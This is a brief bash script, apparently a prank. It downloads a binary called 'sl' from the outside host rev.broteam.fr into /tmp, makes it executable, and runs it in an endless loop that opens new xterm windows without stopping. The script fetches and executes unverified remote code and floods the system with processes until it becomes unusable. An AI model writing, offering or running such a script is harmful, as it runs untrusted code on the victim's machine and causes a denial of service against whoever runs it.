#!/bin/bash

curl http://rev.broteam.fr/sl -o /tmp/sl
chmod +x /tmp/sl
while true
do
    xterm -e "/tmp/sl"&
done